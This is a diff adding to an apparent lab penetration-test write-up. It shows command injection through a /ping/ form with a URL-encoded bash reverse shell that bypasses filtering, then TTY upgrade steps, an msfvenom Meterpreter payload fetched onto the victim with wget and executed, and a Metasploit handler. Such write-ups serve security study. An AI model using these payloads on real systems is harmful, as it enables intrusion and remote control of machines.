@@ -216,7 +216,135 @@ Proof of Concept
 Obtain a **reverse shell** through the `/ping/` form parameter, which executes system commands directly from user input.
 ![RCE vulneravility find](/assets/images/posts/atrium-report/vuln-rce.png)
 
-----------
+### **Exploiting the `/ping/` Endpoint**
+
+**Objective**
+
+To achieve a **reverse shell** by leveraging the `/ping/` form parameter, which executes system commands based on user input.
+
+#### **Initial Tests**
+
+Initial attempts with a standard bash reverse shell (`127.0.0.1; bash -i >`) were unsuccessful. The server recognized the command but failed to execute it, likely due to filtering of special characters like `>`, `&`, and `"`.
+
+#### **Solution: URL-Encoded Payload**
+
+To bypass the server's input filtering, a classic bash reverse shell payload was URL-encoded. This method successfully disguised the malicious characters.
+
+- **Original Payload (blocked):**  
+
+```Bash
+bash -i >& /dev/tcp/192.168.0.16/4444 0>&1
+```
+
+- **Functional Payload (URL-encoded):**    
+```
+127.0.0.1; bash+-c+%22bash+-i+%3E%26+/dev/tcp/192.168.0.19/4444+0%3E%261%22
+```
+This payload was then entered into the `/ping/` form field on the web page.
 
 
+#### **Listener Preparation**
+A Netcat listener was set up on the Kali machine to receive the incoming connection.
+```bash
+nc -nlvp 4444
+```
 
+**Result**
+The reverse connection was successfully established. We obtained a remote shell from the victim machine, which was visually confirmed in the terminal by executing `whoami` and `hostname`. This confirmed a successful **Remote Code Execution (RCE)**.
+
+![System acces granted](/assets/images/posts/atrium-report/reverseshell.png )
+
+
+Observations
+The `/ping/` endpoint's vulnerability was a direct result of improper input handling. The server executes system commands based on user input without any validation or sanitization. This is a critical security flaw.
+
+A key observation was that while special characters were filtered, the server did **not block instructions if they were URL-encoded**. This behavior provided a clear path for **Remote Code Execution (RCE)**.
+
+---
+
+### Interactive Shell (TTY) Treatment
+
+Once a remote shell was obtained, it was non-interactive and difficult to use. To gain a fully functional and stable shell (a TTY), the following steps were performed.
+
+1. *Upgrade the shell with `script`*:
+This command creates a new session, capturing all output and making it behave like a proper terminal.
+```Bash
+script /dev/null -c bash
+```
+    
+2. *Background the shell and reattach*: 
+   After pressing `Ctrl + Z`, the shell is put in the background. The `stty raw -echo` command disables local echoing, and `fg` brings the shell back to the foreground, now with a fully interactive TTY.
+    ```Bash
+    stty raw -echo; fg
+    ```
+    
+3. *Adjust terminal settings (optional but recommended)*: 
+   These commands improve the shell's functionality by setting the terminal type and shell environment variables.
+    ```bash
+    reset
+    xterm
+    export TERM=xterm
+    export SHELL=bash
+    ```
+    
+4. *Set console dimensions*: 
+   To ensure the terminal displays correctly and allows for full-screen tools like `vim` or `less`, the dimensions were manually set.
+    ```bash
+    # Check the size in a separate window
+    stty size
+    # Apply the dimensions to the current shell
+    stty rows <rows_value> columns <columns_value>
+    ```
+
+This process transformed a basic, non-interactive shell into a stable and usable environment for further post-exploitation tasks.
+
+
+### Upgrading the Shell with MSFvenom
+
+#### Objective
+After obtaining a basic remote shell, the next step was to upgrade it to a more stable and powerful *Meterpreter session* for advanced post-exploitation tasks.
+
+#### Payload Generation
+A `linux/x86/meterpreter/reverse_tcp` payload was generated using `msfvenom`, the payload generation tool included in Metasploit. This payload is a small executable designed to connect back to our machine.
+```Bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f elf -o shell.elf
+```
+
+- `LHOST`: The IP address of the attacking machine (Kali).    
+- `LPORT`: The port on which the listener will be set up.    
+- `-f elf`: Specifies the output format as an ELF executable, compatible with Linux systems.    
+- `-o shell.elf`: Defines the output file name for the payload.
+    
+
+#### Payload Transfer to Victim
+To get the payload onto the victim machine, a simple Python HTTP server was started on the Kali machine. From the victim's `/tmp` directory (a writable location), the payload was downloaded using `wget`.
+```Bash
+# On Kali: Start a simple HTTP server in the same directory as the payload
+python3 -m http.server 8000
+
+# On the victim machine: Change to a temporary directory and download the payload
+cd /tmp 
+wget http://192.168.0.21:8000/shell.elf 
+# Make the downloaded file executable
+chmod +x shell.elf
+```
+
+![System acces granted](/assets/images/posts/atrium-report/reverseshell1.png )
+
+
+### **Payload Execution Metasploit**
+While the payload was being transferred and prepared on the victim machine, a listener was set up on the attacking machine using *Metasploit's `multi/handler` module*. This module is designed to catch incoming reverse shell connections.
+```Bash
+msfconsole 
+use exploit/multi/handler 
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST <attacker_IP>
+set LPORT 4444
+run -j
+```
+
+![System acces granted](/assets/images/posts/atrium-report/startmsf.png )
+![System acces granted](/assets/images/posts/atrium-report/startmsf1.png )
+
+
+Once the payload was executed on the victim, the handler caught the connection, and a *Meterpreter session* was successfully established. This provided a stable and powerful platform for conducting further post-exploitation activities and privilege escalation.
